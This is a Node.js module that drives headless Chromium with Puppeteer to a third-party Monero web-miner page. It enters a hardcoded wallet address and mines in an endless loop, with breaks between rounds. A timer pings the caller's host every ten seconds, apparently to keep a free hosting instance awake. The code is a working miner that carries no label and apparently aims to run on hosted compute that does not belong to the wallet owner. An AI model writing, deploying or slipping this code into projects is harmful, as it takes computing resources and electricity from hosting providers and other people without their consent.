const puppeteer = require("puppeteer");
const axios = require("axios").default;

module.exports = function (host) {
  return new Promise((resolve, reject) => {
    (async () => {
      let result = [];
      let obj = [];
      console.log("Started");
      let intervaloPing = setInterval(async () => {
        try {
          await axios.get(`https://${host}/ping`).then((response) => {
            console.log(response.data);
            console.log(new Date(Date.now()).toGMTString());
            console.log(new Date(Date.now()).toLocaleTimeString());
          });
        } catch (error) {}
      }, 10000);

      let browser = await puppeteer.launch({
        headless: true,
        args: ["--no-sandbox"],
      });

      let page = await browser.newPage();

      const randomNumber = (min, max) => {
        return Math.floor(Math.random() * (max - min) + min);
      };
      const clearInput = async (page, { selector }) => {
        const input = await page.$(selector);
        await input.click({ clickCount: 3 });
        await page.keyboard.press("Backspace");
      };
      while (true) {
        await page.goto(
          "https://www.moneroocean.crypto-webminer.com/moneroocean.html",
          {
            waitUntil: "networkidle0",
          }
        );
        await page.waitForSelector('[id="walletmoneroocean"]');
        await clearInput(page, { selector: '[id="walletmoneroocean"]' });

        await page.type(
          '[id="walletmoneroocean"]',
          "41qHbA4nawPikiTpTd8UWoS5MGipUeLbjf5dq7RyhNPnLG2cFvksYnjiSegchMQVpqWChpr4FSFGV1uqkGLAUm9C6Tq5Uyf"
        );
        await page.waitForSelector('[id="start"]');
        let butval = await page.evaluate(() => {
          return document.querySelector('[id="start"]').innerText;
        });
        while (butval === "Start") {
          await page.waitForTimeout(1000);
          await page.click('[id="start"]');
          await page.waitForTimeout(1000);
          butval = await page.evaluate(() => {
            return document.querySelector('[id="start"]').innerText;
          });
        }
        await page.waitForTimeout(1000);
        let acepted = await page.evaluate(() => {
          try {
            return document
              .querySelector('[id="accepted-shares"]')
              .innerText.split("|")[1];
          } catch (error) {}
        });
        while (isNaN(parseInt(acepted)) || parseInt(acepted) <= 0) {
          await page.waitForTimeout(1000);
          acepted = await page.evaluate(() => {
            try {
              return document
                .querySelector('[id="accepted-shares"]')
                .innerText.split("|")[1];
            } catch (error) {}
          });
        }
        await page.click('[id="start"]');

        await page.waitForTimeout(randomNumber(60000, 90000));
      }

      resolve([result, obj]);
    })();
  });
};
